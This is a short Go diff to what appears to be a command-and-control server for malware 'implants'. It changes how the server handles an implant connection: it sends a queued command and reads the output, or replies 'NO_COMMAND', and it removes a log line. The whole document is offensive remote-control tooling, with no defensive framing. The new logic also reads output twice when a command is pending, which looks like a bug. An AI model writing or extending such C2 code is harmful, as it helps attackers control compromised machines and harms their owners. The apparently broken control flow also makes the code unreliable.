@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"log"
 	"net"
 )
@@ -20,14 +19,18 @@ func initalizeServer() {
 			log.Println(" [-] Error accepting connection")
 			continue
 		}
-
-		fmt.Println("Implant connected: ", conn.RemoteAddr())
 		go handleImplants(conn)
 	}
 }
 
 func handleImplants(conn net.Conn) {
 	defer conn.Close()
-	sendCommands(conn)
+	if pendingCommand != "" {
+		sendCommands(conn)
+		pendingCommand = ""
+		receiveOutput(conn)
+	} else {
+		conn.Write([]byte("NO_COMMAND"))
+	}
 	receiveOutput(conn)
 }
